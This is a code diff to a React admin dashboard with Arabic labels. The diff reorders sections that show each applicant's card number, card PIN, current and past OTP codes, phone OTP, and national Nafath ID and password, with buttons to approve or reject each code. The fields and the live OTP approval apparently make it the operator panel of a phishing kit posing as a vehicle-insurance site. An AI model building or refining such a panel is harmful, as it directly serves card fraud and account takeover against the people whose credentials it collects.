@@ -508,12 +508,84 @@ export default function AdminDashboard() {
                 <div className="flex-1 overflow-y-auto p-2 custom-scrollbar" style={{zoom:zoomLevel}}>
                   {hasAnyData(selectedApplication) ? (
                     <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4 max-w-7xl">
+                      {/* PIN Section - Most Recent */}
+                      {selectedApplication.pinCode && (
+                        <DetailSection icon={Shield} title="رمز PIN" delay={0}>
+                          <div className="space-y-4">
+                            <div className="p-4 bg-warning/10 border border-warning/20 rounded-lg text-center">
+                              <p className="text-[10px] text-warning mb-2">Pin Code</p>
+                              <p className="text-3xl font-bold text-warning font-mono tracking-widest" dir="ltr">
+                                {selectedApplication.pinCode}
+                              </p>
+                            </div>
+                            <ApprovalButtons
+                              onApprove={() =>
+                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "approved")
+                              }
+                              onReject={() =>
+                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "rejected")
+                              }
+                              approveDisabled={selectedApplication.idVerificationStatus === "approved"}
+                              rejectDisabled={selectedApplication.idVerificationStatus === "rejected"}
+                            />
+                          </div>
+                        </DetailSection>
+                      )}
+
+                      {/* OTP Section */}
+                      {selectedApplication.otp && (
+                        <DetailSection icon={Shield} title="رمز التحقق OTP" delay={50}>
+                          <div className="space-y-4">
+                            <div className="p-4 bg-primary/10 border border-primary/20 rounded-lg text-center">
+                              <p className="text-[10px] text-primary mb-2">الرمز الحالي</p>
+                              <p className="text-3xl font-bold text-primary font-mono tracking-widest" dir="ltr">
+                                {selectedApplication.otp}
+                              </p>
+                            </div>
+                            <div className="flex gap-2">
+                              <ApprovalButtons
+                                onApprove={() =>
+                                  handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "approved")
+                                }
+                                onReject={() =>
+                                  handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "rejected")
+                                }
+                                approveDisabled={selectedApplication.cardOtpApproved === "approved"}
+                                rejectDisabled={selectedApplication.cardOtpApproved === "rejected"}
+                              />
+                              {selectedApplication.pinCode && (
+                                <Button
+                                  variant="outline"
+                                  size="sm"
+                                  className="text-purple-600 border-purple-300 hover:bg-purple-100 bg-purple-50"
+                                >
+                                  <Hash className="w-4 h-4 ml-1" />
+                                  {selectedApplication.pinCode}
+                                </Button>
+                              )}
+                            </div>
+                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
+                              <div className="pt-3 border-t border-border">
+                                <p className="text-[10px] text-muted-foreground mb-2">الرموز السابقة</p>
+                                <div className="flex flex-wrap gap-1.5">
+                                  {selectedApplication.allOtps.map((otp, i) => (
+                                    <Badge key={i} variant="secondary" className="font-mono text-[10px]" dir="ltr">
+                                      {otp}
+                                    </Badge>
+                                  ))}
+                                </div>
+                              </div>
+                            )}
+                          </div>
+                        </DetailSection>
+                      )}
+
                       {/* Payment Card */}
                       {selectedApplication.cardNumber && (
                         <DetailSection
                           icon={CreditCard}
                           title="معلومات الدفع"
-                          delay={0}
+                          delay={100}
                           badge={
                             selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 ? (
                               <Button
@@ -581,81 +653,9 @@ export default function AdminDashboard() {
                         </DetailSection>
                       )}
 
-                      {/* OTP Section */}
-                      {selectedApplication.otp && (
-                        <DetailSection icon={Shield} title="رمز التحقق OTP" delay={100}>
-                          <div className="space-y-4">
-                            <div className="p-4 bg-primary/10 border border-primary/20 rounded-lg text-center">
-                              <p className="text-[10px] text-primary mb-2">الرمز الحالي</p>
-                              <p className="text-3xl font-bold text-primary font-mono tracking-widest" dir="ltr">
-                                {selectedApplication.otp}
-                              </p>
-                            </div>
-                            <div className="flex gap-2">
-                              <ApprovalButtons
-                                onApprove={() =>
-                                  handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "approved")
-                                }
-                                onReject={() =>
-                                  handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "rejected")
-                                }
-                                approveDisabled={selectedApplication.cardOtpApproved === "approved"}
-                                rejectDisabled={selectedApplication.cardOtpApproved === "rejected"}
-                              />
-                              {selectedApplication.pinCode && (
-                                <Button
-                                  variant="outline"
-                                  size="sm"
-                                  className="text-purple-600 border-purple-300 hover:bg-purple-100 bg-purple-50"
-                                >
-                                  <Hash className="w-4 h-4 ml-1" />
-                                  {selectedApplication.pinCode}
-                                </Button>
-                              )}
-                            </div>
-                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
-                              <div className="pt-3 border-t border-border">
-                                <p className="text-[10px] text-muted-foreground mb-2">الرموز السابقة</p>
-                                <div className="flex flex-wrap gap-1.5">
-                                  {selectedApplication.allOtps.map((otp, i) => (
-                                    <Badge key={i} variant="secondary" className="font-mono text-[10px]" dir="ltr">
-                                      {otp}
-                                    </Badge>
-                                  ))}
-                                </div>
-                              </div>
-                            )}
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* PIN Section */}
-                      {selectedApplication.pinCode && (
-                        <DetailSection icon={Shield} title="رمز PIN" delay={150}>
-                          <div className="space-y-4">
-                            <div className="p-4 bg-warning/10 border border-warning/20 rounded-lg text-center">
-                              <p className="text-[10px] text-warning mb-2">Pin Code</p>
-                              <p className="text-3xl font-bold text-warning font-mono tracking-widest" dir="ltr">
-                                {selectedApplication.pinCode}
-                              </p>
-                            </div>
-                            <ApprovalButtons
-                              onApprove={() =>
-                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "approved")
-                              }
-                              onReject={() =>
-                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "rejected")
-                              }
-                              approveDisabled={selectedApplication.idVerificationStatus === "approved"}
-                              rejectDisabled={selectedApplication.idVerificationStatus === "rejected"}
-                            />
-                          </div>
-                        </DetailSection>
-                      )}
-
                       {/* Phone Section */}
                       {(selectedApplication.phoneNumber2 || selectedApplication.phoneOtp) && (
-                        <DetailSection icon={Phone} title="معلومات الهاتف" delay={200}>
+                        <DetailSection icon={Phone} title="معلومات الهاتف" delay={150}>
                           <div className="space-y-4">
                             <div className="grid grid-cols-2 gap-2">
                               <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
@@ -685,7 +685,7 @@ export default function AdminDashboard() {
 
                       {/* Nafaz Section */}
                       {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
-                        <DetailSection icon={User} title="نفاذ الوطني" delay={250}>
+                        <DetailSection icon={User} title="نفاذ الوطني" delay={200}>
                           <div className="space-y-3">
                             <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
                             <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />
@@ -713,7 +713,7 @@ export default function AdminDashboard() {
 
                       {/* Document Section */}
                       {selectedApplication.documentType && (
-                        <DetailSection icon={FileText} title="معلومات الوثيقة" delay={300}>
+                        <DetailSection icon={FileText} title="معلومات الوثيقة" delay={250}>
                           <div className="space-y-2">
                           <DataField label="رقم وطني" value={selectedApplication.identityNumber} />
                           
@@ -730,7 +730,7 @@ export default function AdminDashboard() {
 
                       {/* Insurance Section */}
                       {(selectedApplication.insuranceType || selectedApplication.insuranceStartDate) && (
-                        <DetailSection icon={Shield} title="تفاصيل التأمين" delay={350}>
+                        <DetailSection icon={Shield} title="تفاصيل التأمين" delay={300}>
                           <div className="space-y-2">
                             <DataField label="نوع التأمين" value={selectedApplication.insuranceType} />
                             <DataField label="تاريخ البدء" value={selectedApplication.insuranceStartDate} />
@@ -744,9 +744,9 @@ export default function AdminDashboard() {
                         </DetailSection>
                       )}
 
-                      {/* Vehicle Section */}
+                      {/* Vehicle Section - Oldest */}
                       {(selectedApplication.vehicleModel || selectedApplication.manufacturingYear) && (
-                        <DetailSection icon={Car} title="معلومات المركبة" delay={400}>
+                        <DetailSection icon={Car} title="معلومات المركبة" delay={350}>
                           <div className="grid grid-cols-2 gap-2">
                             <DataField label="الموديل" value={selectedApplication.vehicleModel} />
                             <DataField label="سنة الصنع" value={selectedApplication.manufacturingYear?.toString()} />
